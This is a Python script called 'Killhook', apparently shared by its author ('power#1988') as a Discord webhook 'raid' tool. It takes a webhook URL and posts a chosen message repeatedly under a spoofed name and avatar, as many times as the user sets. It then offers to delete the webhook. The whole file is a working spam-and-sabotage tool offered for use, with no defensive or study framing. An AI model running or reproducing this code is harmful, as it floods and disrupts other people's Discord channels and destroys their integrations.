import requests, colorama, os 
from colorama import init
init(autoreset=True)

logo = colorama.Fore.RED + '''
 ██ ▄█▀ ██▓ ██▓     ██▓     ██░ ██  ▒█████   ▒█████   ██ ▄█▀
 ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓██░ ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ 
▓███▄░ ▒██▒▒██░    ▒██░    ▒██▀▀██░▒██░  ██▒▒██░  ██▒▓███▄░ 
▓██ █▄ ░██░▒██░    ▒██░    ░▓█ ░██ ▒██   ██░▒██   ██░▓██ █▄ 
▒██▒ █▄░██░░██████▒░██████▒░▓█▒░██▓░ ████▓▒░░ ████▓▒░▒██▒ █▄
▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒
░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░
░ ░░ ░  ▒ ░  ░ ░     ░ ░    ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░ 
░  ░    ░      ░  ░    ░  ░ ░  ░  ░    ░ ░      ░ ░  ░  ░   
------------------------------------------------------------
power#1988 | dsc.gg/binded join up brodie |github/gitpowerr 
------------------------------------------------------------                                                            
'''

def spam():
    while True:
        webhook = input("Webhook Here : ")
        try:
            valid = requests.get(webhook)
            pass
        except:
            print(colorama.Fore.RED + "[!] Invalid Webhook")
            continue
        if valid.status_code == 200:
            content = input("Content Here : ")
            name = input("Bot Name Here : ")
            avatar = input("Avatar URL Here (optional): ")
            amount = int(input("Amount : "))
            count = 1
            while count <= amount:
                requests.post(webhook, json={'content': content, 'username': name, 'avatar_url': avatar})
                print(colorama.Fore.GREEN + f"[+] Sent {count}")
                count += 1 
            delete = input(colorama.Fore.LIGHTMAGENTA_EX + "Delete Webhook ? Y/n : ")
            if delete.upper() == 'Y':
                requests.delete(webhook)
                print(colorama.Fore.GREEN + "[+] Deleted!\n")
                print()
        else:
            print(colorama.Fore.RED + "[!] Invalid Webhook!\n")

options = ('1', '2', 'x', 'X')
while True:
    print(logo)
    print("""
    [1] Raid
    [2] Credits
    [X] Exit
    """)
    choice = input("\n> ")
    if choice in options:
        break
    else:
        print()

if choice == '1':
    os.system("title Killhook")
    spam()
elif choice == '2':
    print("""power#1988 | dsc.gg/binded""")
elif choice.upper() == 'X':
    exit()


